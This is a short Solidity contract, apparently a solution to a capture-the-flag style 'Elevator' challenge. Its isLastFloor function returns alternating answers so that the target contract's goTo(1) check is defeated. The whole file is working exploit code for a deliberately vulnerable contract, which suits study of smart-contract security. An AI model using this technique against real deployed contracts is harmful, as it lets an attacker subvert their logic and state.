// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Elevator} from "./Elevator.sol";

contract ElevatorCaller {
    Elevator private immutable i_elevator;
    bool private isTopFloor;

    constructor(address _elevator) {
        i_elevator = Elevator(_elevator);
        isTopFloor = true;
    }

    function isLastFloor(uint256) external returns (bool) {
        isTopFloor = !isTopFloor;
        return isTopFloor;
    }

    function callElevator() external {
        i_elevator.goTo(1);
    }
}
